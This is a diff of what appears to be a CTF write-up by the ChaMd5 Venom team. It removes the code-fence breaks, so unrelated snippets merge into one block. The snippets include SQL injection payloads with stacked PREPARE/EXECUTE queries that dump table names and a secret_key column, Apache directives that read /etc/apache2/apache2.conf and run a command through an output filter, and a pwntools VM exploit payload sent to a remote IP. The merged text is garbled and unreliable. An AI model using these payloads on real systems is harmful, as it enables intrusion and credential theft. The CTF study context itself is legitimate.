@@ -32,35 +32,10 @@ ChaMd5 Venom 招收大佬入圈
 
 ```
 name='; PREPARE pcat AS select 1,2; EXECUTE pcat;--
-```
-
-
-
-```
 name='; PREPARE pcat AS select 1,tablename from pg_tables where schemaname='public' offset 0;; EXECUTE pcat;--
-```
-
-
-
-```
 select 1,column_name from information_schema.columns where table_schema='public' and table_name='target_credentials' offset 0
-```
-
-
-
-```
 name='; PREPARE pcat AS select table_name,column_name from information_schema.columns offset 0; EXECUTE pcat;--
-```
-
-
-
-```
 name='; PREPARE pcat AS select 1,secret_key from target_credentials offset 0; EXECUTE pcat;--
-```
-
-
-
-```
 sampleFile = req.files[req.query.formid];
 userdir = md5(md5(req.socket.remoteAddress) + sampleFile.md5);
 userfile = sampleFile.name.toString();
@@ -68,25 +43,10 @@ if(userfile.includes('/')||userfile.includes('..')){
     return res.status(500).send("Invalid file name");
 }
 uploadPath = '/uploads/' + userdir + '/' + userfile;
-```
-
-
-
-```
 ErrorDocument 404 "%{file:/etc/apache2/apache2.conf}"
-```
-
-
-
-```
 ExtFilterDefine 7f39f8317fgzip mode=output cmd=/bin/gzip
-```
-
-
-
-```
 from pwn import *
-#p = process("./svme")
+    #p = process("./svme")
 p = remote("47.243.140.252", 1337)
 '''
     { "noop",   0 },    // 0
@@ -117,15 +77,11 @@ payload += p32(0xb)+p32(0x87)+p32(0xb)+p32(0x86)+p32(0x9)+p32(0xffffffff)+p32(
 payload += p32(0xb)+p32(0x87)+p32(0xb)+p32(0x86)+p32(0x9)+p32(0x190a37)+p32(1)+p32(0xd)+p32(0x8a)+p32(0xd)+p32(0x8b)
 payload += p32(0xb)+p32(0x87)+p32(0xb)+p32(0x86)+p32(0x9)+p32(0x2e89d)+p32(1)+p32(0xd)+p32(0x8c)+p32(0xd)+p32(0x8d)
 payload += p32(0xf)*2+p32(0xa)+p32(0x2)+p32(0xa)+p32(0x1)
-payload += p32(9)+p32(0)+p32(9)+p32(0)+p32(9)+p32(0)+p32(9)+p32(0)+p32(0x12)#
+payload += p32(9)+p32(0)+p32(9)+p32(0)+p32(9)+p32(0)+p32(9)+p32(0)+p32(0x12)
+#
 p.send(payload.ljust(0x200, b"x00"))
 
 p.interactive()
-```
-
-
-
-```
 rwctf{Super_Hunters_Conquer_Together}
 ```
 
